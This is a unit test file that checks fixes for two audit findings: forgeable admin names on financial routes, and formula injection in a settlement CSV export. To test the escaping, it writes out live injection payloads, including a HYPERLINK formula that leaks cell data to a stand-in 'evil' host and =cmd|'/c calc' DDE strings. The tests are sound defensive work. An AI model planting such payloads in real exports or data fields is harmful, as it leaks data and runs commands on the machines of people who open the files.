/**
 * Financial attribution and export safety tests (audit findings H-14 and H-15).
 *
 * H-14 — every financial operation recorded the `adminName` the CLIENT sent, not
 *   the one derived from the verified session, even though jwt.verify already
 *   returns `username`. The financial audit trail was therefore forgeable end to
 *   end: a large payment could be filed under a colleague's name with no
 *   independent record to contradict it.
 *
 * H-15 — the settlement CSV export escaped double quotes in ONE cell, which keeps
 *   the file structurally valid but does nothing about formula injection. A store
 *   named `=HYPERLINK("http://evil/"&A1,"x")` — the store picks its own display
 *   name — executes on the supervisor's machine when the export is opened.
 *
 * Run:  node --test tests/unit/admin-audit-export.test.mjs
 */
import { test, describe } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

import { csvCell, csvNumber } from "../../server/orderValidation.ts";

const here = dirname(fileURLToPath(import.meta.url));
const read = (p) => readFileSync(join(here, "../../", p), "utf8");
const ROUTES = read("server/routes.ts");
const ADMIN_AUTH = read("server/adminAuth.ts");

function handlerBody(src, marker) {
  const i = src.indexOf(marker);
  if (i === -1) return "";
  const rest = src.slice(i + marker.length);
  const next = rest.search(/\n\s*app\.(get|post|put|patch|delete)\(/);
  return marker + (next === -1 ? rest : rest.slice(0, next));
}

const MONEY_ROUTES = [
  '/api/admin/settlements/approve',
  '/api/admin/settlements/reject',
  '/api/admin/settlements/complete',
  '/api/admin/driver-wallet/recharge',
  '/api/admin/driver-wallet/payment',
  '/api/admin/driver-wallet/adjustment',
];

describe("H-14 — the admin name comes from the session", () => {
  test("the session getter exists and only trusts admin tokens", () => {
    assert.match(ADMIN_AUTH, /export function getSessionUsername\(req: Request\): string/);
    assert.match(ADMIN_AUTH, /if \(decoded\?\.type !== "admin"\) return "";/);
  });

  for (const path of MONEY_ROUTES) {
    test(`${path} derives the name from the session`, () => {
      const body = handlerBody(ROUTES, `app.post("${path}"`);
      assert.ok(body.length > 0, `${path} not found`);
      assert.match(
        body,
        /const adminName = getSessionUsername\(req\) \|\| "admin";/,
        `REGRESSION: ${path} takes the auditor's name from the client again`,
      );
    });

    test(`${path} no longer destructures adminName from the body`, () => {
      const body = handlerBody(ROUTES, `app.post("${path}"`);
      const destructure = body.slice(0, body.indexOf("\n", body.indexOf("= req.body")) + 1);
      assert.doesNotMatch(
        destructure,
        /\badminName\b/,
        `REGRESSION: ${path} reads adminName off req.body`,
      );
    });
  }

  test("no financial route falls back to a client value", () => {
    for (const path of MONEY_ROUTES) {
      const body = handlerBody(ROUTES, `app.post("${path}"`);
      assert.doesNotMatch(body, /adminName: adminName \|\| ""/, `${path} still defaults a body value`);
    }
  });

  test("reading an existing payment's recorded name is untouched", () => {
    // The read paths echo what was stored; only the write paths changed.
    assert.match(ROUTES, /notes: p\.notes, method: p\.method, adminName: p\.adminName,/);
  });
});

describe("H-15 — a spreadsheet formula cannot ride out in the export", () => {
  test("the four formula triggers are neutralised", () => {
    for (const c of ["=", "+", "-", "@"]) {
      assert.equal(csvCell(`${c}cmd|'/c calc'!A1`), `"'${c}cmd|'/c calc'!A1"`, `trigger ${c} not neutralised`);
    }
  });

  test("the exact payload from the finding is defused", () => {
    const evil = '=HYPERLINK("http://evil/"&A1&B1,"click")';
    const cell = csvCell(evil);
    assert.ok(cell.startsWith(`"'=`), `REGRESSION: formula still live → ${cell}`);
  });

  test("leading whitespace does not smuggle a trigger past the check", () => {
    // Spreadsheets trim the cell before deciding whether it is a formula.
    assert.ok(csvCell("   =1+1").startsWith(`"'`));
    assert.ok(csvCell("\t=1+1").startsWith(`"'`));
  });

  test("tab and carriage return are treated as triggers too", () => {
    assert.ok(csvCell("\t=cmd").startsWith(`"'`));
    assert.ok(csvCell("\r=cmd").startsWith(`"'`));
  });

  test("quotes are doubled, so the row structure cannot be broken", () => {
    assert.equal(csvCell('a"b'), '"a""b"');
    assert.equal(csvCell('","injected'), '"\"\",\"\"injected"'.replace(/\\/g, ""));
  });

  test("a comma or newline in a value stays inside its own cell", () => {
    assert.equal(csvCell("متجر, الضلوعية"), '"متجر, الضلوعية"');
    assert.equal(csvCell("line1\nline2"), '"line1\nline2"');
  });

  test("ordinary Arabic names pass through unchanged", () => {
    assert.equal(csvCell("متجر الضلوعية"), '"متجر الضلوعية"');
    assert.equal(csvCell("07701234567"), '"07701234567"');
  });

  test("null and undefined become empty cells, never the string 'undefined'", () => {
    assert.equal(csvCell(null), '""');
    assert.equal(csvCell(undefined), '""');
  });

  test("numeric cells stay numeric and can never carry text", () => {
    assert.equal(csvNumber(1500), "1500");
    assert.equal(csvNumber("1500"), "1500");
    for (const junk of ["=1+1", "abc", NaN, Infinity, null, undefined]) {
      assert.equal(csvNumber(junk), "0", `${JSON.stringify(junk)} leaked into a numeric cell`);
    }
  });

  test("the export routes every text cell through the helper", () => {
    const body = handlerBody(ROUTES, 'app.get("/api/admin/settlement-export"');
    assert.ok(body.length > 0, "export route not found");
    for (const cell of ["csvCell(a.accountId)", "csvCell(a.accountName)", "csvCell(a.status)", "csvCell(last)"]) {
      assert.ok(body.includes(cell), `REGRESSION: ${cell} is not escaped`);
    }
    for (const cell of ["csvNumber(a.totalOrders)", "csvNumber(a.outstanding)", "csvNumber(a.totalSettled)"]) {
      assert.ok(body.includes(cell), `REGRESSION: ${cell} is not coerced`);
    }
  });

  test("the old hand-rolled row template is gone", () => {
    const body = handlerBody(ROUTES, 'app.get("/api/admin/settlement-export"');
    assert.doesNotMatch(
      body,
      /`"\$\{a\.accountId\}","\$\{name\}"/,
      "REGRESSION: the unescaped template literal is back",
    );
  });

  test("a full row built from a hostile account is safe end to end", () => {
    const hostile = {
      accountId: '=cmd|"/c calc"!A1',
      accountName: '=HYPERLINK("http://evil/"&A1,"x")',
      totalOrders: "=1+1",
      outstanding: 250000,
      totalSettled: 0,
      status: "-active",
      last: "2026-08-09",
    };
    const row = [
      csvCell(hostile.accountId), csvCell(hostile.accountName), csvNumber(hostile.totalOrders),
      csvNumber(hostile.outstanding), csvNumber(hostile.totalSettled), csvCell(hostile.status),
      csvCell(hostile.last),
    ].join(",");
    // No cell may begin a formula: every value sits inside quotes, and any cell
    // whose content starts with a trigger is prefixed with an apostrophe.
    for (const cell of row.split(/,(?=(?:[^"]*"[^"]*")*[^"]*$)/)) {
      const inner = cell.startsWith('"') ? cell.slice(1, -1) : cell;
      assert.ok(
        !["=", "+", "-", "@"].includes(inner.trimStart()[0]),
        `cell still opens a formula: ${cell}`,
      );
    }
    assert.equal(row.split(/,(?=(?:[^"]*"[^"]*")*[^"]*$)/).length, 7, "column count drifted");
  });
});
